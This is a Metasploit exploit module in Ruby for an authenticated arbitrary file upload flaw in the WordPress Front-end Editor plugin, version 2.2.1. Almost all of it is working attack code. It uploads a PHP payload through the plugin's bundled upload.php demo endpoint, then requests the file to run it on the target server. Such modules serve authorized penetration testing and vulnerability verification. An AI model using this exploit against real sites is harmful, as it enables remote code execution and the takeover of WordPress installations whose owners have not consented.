##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'Wordpress Front-end Editor File Upload',
      'Description'    => %q{
          The Wordpress Front-end Editor plugin contains an 
authenticated file upload
          vulnerability. We can upload arbitrary files to the upload 
folder, because
          the plugin also uses it's own file upload mechanism instead of 
the wordpress
          api it's possible to upload any file type.
      },
      'Author'         =>
        [
          'Sammy', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'     # 
Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '83637'],
          ['WPVDB', '7569'],
          ['URL', 
'http://www.opensyscom.fr/Actualites/wordpress-plugins-front-end-editor-arbitrary-file-upload-vulnerability.html']
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Front-End Editor 2.2.1', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 04 2012'))
  end

  def check
    check_plugin_version_from_readme('front-end-editor', '2.3')
  end

  def exploit
    print_status("#{peer} - Trying to upload payload")
    filename = "#{rand_text_alpha_lower(5)}.php"

    print_status("#{peer} - Uploading payload")
    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => normalize_uri(wordpress_url_plugins, 
'front-end-editor', 'lib', 'aloha-editor', 'plugins', 'extra', 
'draganddropfiles', 'demo', 'upload.php'),
      'ctype'    => 'application/octet-stream',
      'headers'  => {
        'X-File-Name' => "#{filename}"
      },
      'data' => payload.encoded
    )

    if res
      if res.code == 200
        register_files_for_cleanup(filename)
      else
        fail_with(Failure::Unknown, "#{peer} - Unexpected response, 
exploit probably failed!")
      end
    else
      fail_with(Failure::Unknown, 'Server did not respond in an expected 
way')
    end

    print_status("#{peer} - Calling uploaded file #{filename}")
    send_request_cgi(
      { 'uri'    => normalize_uri(wordpress_url_plugins, 
'front-end-editor', 'lib', 'aloha-editor', 'plugins', 'extra', 
'draganddropfiles', 'demo', "#{filename}") },
      5
    )
  end
end
